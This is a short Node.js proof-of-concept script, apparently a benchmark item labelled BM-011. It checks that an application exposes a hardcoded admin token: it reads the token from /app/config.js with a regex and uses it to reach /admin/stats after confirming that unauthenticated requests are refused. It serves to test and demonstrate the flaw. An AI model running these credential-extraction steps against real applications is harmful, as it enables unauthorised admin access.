'use strict';

const poc = require('./lib/common');

// BM-011: hardcoded admin token. Anyone with the source can read it and use it.
const fs = require('fs');

poc.run(async function () {
  const source = fs.readFileSync('/app/config.js', 'utf8');
  const found = /adminToken:\s*['"]([^'"]+)['"]/.exec(source);
  poc.control(found !== null, 'token pattern found in config.js');
  const denied = await poc.request('GET', '/admin/stats');
  poc.control(denied.status === 403, 'no token is refused');
  const res = await poc.request('GET', '/admin/stats', { headers: { 'x-admin-token': found[1] } });
  poc.finish(res.status === 200, 'status ' + res.status + ' with the token read from the source');
});
